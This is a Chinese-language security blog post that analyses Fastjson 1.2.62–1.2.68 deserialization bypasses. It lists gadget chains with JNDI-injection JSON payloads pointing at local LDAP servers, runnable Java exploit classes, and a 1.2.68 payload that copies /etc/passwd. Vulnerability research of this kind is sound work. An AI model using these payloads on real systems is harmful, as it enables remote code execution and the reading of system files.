# Fastjson 1.2.62-1.2.68版本反序列化漏洞

  
  
&lt;!--more--&gt;  
## 0x01 1.2.62反序列化漏洞  
### 前提条件  
需要开启AutoType  
Fastjson&lt;=1.2.62  
JNDI注入利用所受的JDK版本限制  
目标服务端需要存在`xben-reflect`包；xbean-reflect包的版本不限  
pom.xml  
```xml  
&lt;dependencies&gt;  
  
&lt;dependency&gt;    
 &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    
 &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    
 &lt;version&gt;1.2.62&lt;/version&gt;    
&lt;/dependency&gt;    
&lt;dependency&gt;    
 &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;    
 &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;    
 &lt;version&gt;4.18&lt;/version&gt;    
&lt;/dependency&gt;    
&lt;dependency&gt;    
 &lt;groupId&gt;commons-collections&lt;/groupId&gt;    
 &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    
 &lt;version&gt;3.2.1&lt;/version&gt;    
&lt;/dependency&gt;  
&lt;/dependencies&gt;  
```  
### 漏洞原理与EXP  
新Gadget绕过黑名单限制。  
`org.apache.xbean.propertyeditor.JndiConverter`类的`toObjectImpl()`函数存在JNDI注入漏洞，可由其构造函数处触发利用。  
这里可以到`JndiConverter`这个类里面，看到`toObjectImpl()`方法确实是存在JNDI漏洞的。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408011846417.png)
但是这个`toObjectImpl()`方法并不是`getter/setter`方法，也不是构造函数。  
因为我们对`JndiConverter`这个类进行反序列化的时候，会自动调用它的构造函数，而它的构造函数里面调用了它的父类。所以我们反序列化的时候不仅能够调用`JndiConverter`这个类，还会去调用它的父类`AbstractConverter`  
查找一下哪里调用了`toObjectImpl()`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408011859971.png)
正好在`AbstractConverter`类中的`setter`方法中调用了。  
所以payload可以设置成这样  
```java  
&#34;{\&#34;@type\&#34;:\&#34;org.apache.xbean.propertyeditor.JndiConverte\&#34;, \&#34;AsText\&#34;:\&#34;ldap://127.0.0.1:1234/ExportObject\&#34;}  
&#34;  
```  
EXP如下  
```java  
import com.alibaba.fastjson.JSON;    
import com.alibaba.fastjson.parser.ParserConfig;    
import org.apache.xbean.propertyeditor.JndiConverter;    
    
public class EXP{    
    public static void main(String[] args) {  
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);    
 String poc = &#34;{\&#34;@type\&#34;:\&#34;org.apache.xbean.propertyeditor.JndiConverter\&#34;,&#34;&#43;&#34;\&#34;AsText\&#34;:\&#34;ldap://127.0.0.1:1234/ExportObject\&#34;}&#34;;    
 JSON.parse(poc);  
 }    
}  
```  
### 调试分析  
需要开启autoType，如果未开启autoType、未设置expectClass且类名不再内部黑名单中，是不能恶意家在字节码的。  
直接在`CheckAutoType()`函数上打上断点开始分析，函数位置  
`com\alibaba\fastjson\parser\ParserConfig.java`  
相比于之前版本调试分析时看的`CheckAutoType()`函数，这里新增了一些代码逻辑，这里大致说下，下面代码是判断是否调用AutoType相关逻辑之前的代码，说明如注解：  
```java  
if (typeName == null) {  
          return null;  
      }  
   
// 限制了JSON中@type指定的类名长度  
      if (typeName.length() &gt;= 192 || typeName.length() &lt; 3) {  
          throw new JSONException(&#34;autoType is not support. &#34; &#43; typeName);  
      }  
   
// 单独对expectClass参数进行判断，设置expectClassFlag的值  
// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true  
      final boolean expectClassFlag;  
      if (expectClass == null) {  
          expectClassFlag = false;  
      } else {  
          if (expectClass == Object.class  
                  || expectClass == Serializable.class  
                  || expectClass == Cloneable.class  
                  || expectClass == Closeable.class  
                  || expectClass == EventListener.class  
                  || expectClass == Iterable.class  
                  || expectClass == Collection.class  
                  ) {  
              expectClassFlag = false;  
          } else {  
              expectClassFlag = true;  
          }  
      }  
   
      String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);  
      Class&lt;?&gt; clazz = null;  
   
      final long BASIC = 0xcbf29ce484222325L;  
      final long PRIME = 0x100000001b3L;  
   
// 1.2.43检测，&#34;[&#34;  
      final long h1 = (BASIC ^ className.charAt(0)) * PRIME;  
      if (h1 == 0xaf64164c86024f1aL) { // [  
          throw new JSONException(&#34;autoType is not support. &#34; &#43; typeName);  
      }  
   
// 1.2.41检测，&#34;Lxx;&#34;  
      if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) {  
          throw new JSONException(&#34;autoType is not support. &#34; &#43; typeName);  
      }  
   
// 1.2.42检测，&#34;LL&#34;  
      final long h3 = (((((BASIC ^ className.charAt(0))  
              * PRIME)  
              ^ className.charAt(1))  
              * PRIME)  
              ^ className.charAt(2))  
              * PRIME;  
   
// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true  
      boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,  
              TypeUtils.fnv1a_64(className)  
      ) &gt;= 0;  
```  
## 0x02 1.2.66反序列化漏洞  
### 前提条件  
- 开启AutoType；  
- Fastjson &lt;= 1.2.66；  
- JNDI注入利用所受的JDK版本限制；  
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；  
- br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；  
- com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包;  
### 漏洞原理  
新Gadget绕过黑名单限制  
1.2.66涉及多条Gadget链，原理都是存在JNDI注入漏洞  
`org.apache.shiro.realm.jndi.JndiRealmFactory`类`poc`  
`{&#34;@type&#34;:&#34;org.apache.shiro.realm.jndi.JndiRealmFactory&#34;, &#34;jndiNames&#34;:[&#34;ldap://localhost:1389/Exploit&#34;], &#34;Realms&#34;:[&#34;&#34;]}`  
`br.com.anteros.dbcp.AnterosDBCPConfig`类poc  
```json  
{&#34;@type&#34;:&#34;br.com.anteros.dbcp.AnterosDBCPConfig&#34;,&#34;metricRegistry&#34;:&#34;ldap://localhost:1389/Exploit&#34;}  
{&#34;@type&#34;:&#34;br.com.anteros.dbcp.AnterosDBCPConfig&#34;,&#34;healthCheckRegistry&#34;:&#34;ldap://localhost:1389/Exploit&#34;}  
```  
`com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig`类poc  
```json  
{&#34;@type&#34;:&#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&#34;,&#34;properties&#34;: {&#34;@type&#34;:&#34;java.util.Properties&#34;,&#34;UserTransaction&#34;:&#34;ldap://localhost:1389/Exploit&#34;}}  
```  
### exp  
```java  
import com.alibaba.fastjson.JSON;    
import com.alibaba.fastjson.parser.ParserConfig;    
    
public class EXP_1266 {    
    public static void main(String[] args) {    
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);    
 String poc = &#34;{\&#34;@type\&#34;:\&#34;org.apache.shiro.realm.jndi.JndiRealmFactory\&#34;, \&#34;jndiNames\&#34;:[\&#34;ldap://localhost:1234/ExportObject\&#34;], \&#34;Realms\&#34;:[\&#34;\&#34;]}&#34;;    
//        String poc = &#34;{\&#34;@type\&#34;:\&#34;br.com.anteros.dbcp.AnterosDBCPConfig\&#34;,\&#34;metricRegistry\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;}&#34;;    
//        String poc = &#34;{\&#34;@type\&#34;:\&#34;br.com.anteros.dbcp.AnterosDBCPConfig\&#34;,\&#34;healthCheckRegistry\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;}&#34;;    
//        String poc = &#34;{\&#34;@type\&#34;:\&#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&#34;,&#34; &#43;    
//                &#34;\&#34;properties\&#34;: {\&#34;@type\&#34;:\&#34;java.util.Properties\&#34;,\&#34;UserTransaction\&#34;:\&#34;ldap://localhost:1389/Exploit\&#34;}}&#34;;    
 JSON.parse(poc);    
 }    
}  
```  
## 0x03 1.2.67反序列化漏洞(黑名单绕过)  
### 前提条件  
- 开启AutoType；  
- Fastjson &lt;= 1.2.67；  
- JNDI注入利用所受的JDK版本限制；  
- org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；  
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；  
### 漏洞原理  
新Gadget绕过黑名单限制  
`org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup`类Poc  
`{&#34;@type&#34;:&#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&#34;, &#34;jndiNames&#34;:[&#34;ldap://localhost:1389/Exploit&#34;], &#34;tm&#34;: {&#34;$ref&#34;:&#34;$.tm&#34;}}`  
`org.apache.shiro.jndi.JndiObjectFactory`类Poc  
```json  
{&#34;@type&#34;:&#34;org.apache.shiro.jndi.JndiObjectFactory&#34;,&#34;resourceName&#34;:&#34;ldap://localhost:1389/Exploit&#34;,&#34;instance&#34;:{&#34;$ref&#34;:&#34;$.instance&#34;}}  
```  
### exp  
```java  
import com.alibaba.fastjson.JSON;    
import com.alibaba.fastjson.parser.ParserConfig;    
import com.sun.xml.internal.ws.api.ha.StickyFeature;    
    
public class EXP_1267 {    
    public static void main(String[] args) {    
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);    
 String poc = &#34;{\&#34;@type\&#34;:\&#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&#34;,&#34; &#43;    
                &#34; \&#34;jndiNames\&#34;:[\&#34;ldap://localhost:1234/ExportObject\&#34;], \&#34;tm\&#34;: {\&#34;$ref\&#34;:\&#34;$.tm\&#34;}}&#34;;    
 JSON.parse(poc);    
 }    
}  
```  
## 0x04 1.2.68反序列化漏洞(expectClass绕过AutoType)  
### 前提条件  
Fastjson&lt;=1.2.68  
利用类必须是expectClass类的子类或实现类，并且不在黑名单中；  
### 漏洞原理  
本次绕过`checkAutoType()`函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类来实现绕过`checkAutoType()`函数绕过恶意操作。  
1、先传入某个类，其加载成功后将作为expectClass参数传入`checkAutoType()`函数；  
2、查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或`setter`方法中存在危险操作则可以被攻击利用；  
### 实际利用  
#### 复制文件（任意文件读取漏洞）  
利用类`org.eclipse.core.internal.localstore.SafeFileOutputStream`  
```java  
&lt;dependency&gt;    
 &lt;groupId&gt;org.aspectj&lt;/groupId&gt;    
 &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;    
 &lt;version&gt;1.9.5&lt;/version&gt;    
&lt;/dependency&gt;  
```  
其`SafeFileOutputStream(java.lang.String,java.lang.String)`构造函数判断了如果`targetPath`文件不存在且`tempPath`文件存在，就会把`tempPath`复制到`targetPath`中，正是利用其构造函数的这个特点来实现Web场景下的任意文件读取  
```java  
public class SafeFileOutputStream extends OutputStream {    
    protected File temp;    
    protected File target;    
    protected OutputStream output;    
    protected boolean failed;    
    protected static final String EXTENSION = &#34;.bak&#34;;    
    
    public SafeFileOutputStream(File file) throws IOException {    
        this(file.getAbsolutePath(), (String)null);    
    }    
    
    public SafeFileOutputStream(String targetPath, String tempPath) throws IOException {    
        this.failed = false;    
        this.target = new File(targetPath);    
        this.createTempFile(tempPath);    
        if (!this.target.exists()) {    
            if (!this.temp.exists()) {    
                this.output = new BufferedOutputStream(new FileOutputStream(this.target));    
                return;    
            }    
    
            this.copy(this.temp, this.target);    
        }    
    
        this.output = new BufferedOutputStream(new FileOutputStream(this.temp));    
    }    
    
    public void close() throws IOException {    
        try {    
            this.output.close();    
        } catch (IOException var2) {    
            IOException e = var2;    
            this.failed = true;    
            throw e;    
        }    
    
        if (this.failed) {    
            this.temp.delete();    
        } else {    
            this.commit();    
        }    
    
    }    
    
    protected void commit() throws IOException {    
        if (this.temp.exists()) {    
            this.target.delete();    
            this.copy(this.temp, this.target);    
            this.temp.delete();    
        }    
    }    
    
    protected void copy(File sourceFile, File destinationFile) throws IOException {    
        if (sourceFile.exists()) {    
            if (!sourceFile.renameTo(destinationFile)) {    
                InputStream source = null;    
                OutputStream destination = null;    
    
                try {    
                    source = new BufferedInputStream(new FileInputStream(sourceFile));    
                    destination = new BufferedOutputStream(new FileOutputStream(destinationFile));    
                    this.transferStreams(source, destination);    
                    destination.close();    
                } finally {    
                    FileUtil.safeClose(source);    
                    FileUtil.safeClose(destination);    
                }    
    
            }    
        }    
    }    
    
    protected void createTempFile(String tempPath) {    
        if (tempPath == null) {    
            tempPath = this.target.getAbsolutePath() &#43; &#34;.bak&#34;;    
        }    
    
        this.temp = new File(tempPath);    
    }    
    
    public void flush() throws IOException {    
        try {    
            this.output.flush();    
        } catch (IOException var2) {    
            IOException e = var2;    
            this.failed = true;    
            throw e;    
        }    
    }    
    
    public String getTempFilePath() {    
        return this.temp.getAbsolutePath();    
    }    
    
    protected void transferStreams(InputStream source, OutputStream destination) throws IOException {    
        byte[] buffer = new byte[8192];    
    
        while(true) {    
            int bytesRead = source.read(buffer);    
            if (bytesRead == -1) {    
                return;    
            }    
    
            destination.write(buffer, 0, bytesRead);    
        }    
    }    
    
    public void write(int b) throws IOException {    
        try {    
            this.output.write(b);    
        } catch (IOException var3) {    
            IOException e = var3;    
            this.failed = true;    
            throw e;    
        }    
    }    
}  
```  
exp  
```java  
{&#34;@type&#34;:&#34;java.lang.AutoCloseable&#34;,&#34;@type&#34;:&#34;org.eclipse.core.internal.localstore.SafeFileOutputStream&#34;,&#34;tempPath&#34;:&#34;/etc/passwd&#34;,&#34;targetPath&#34;:&#34;/tmp/flag&#34;}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408032212986.png)
  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/fastjson-1.2.62-1.2.68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/  

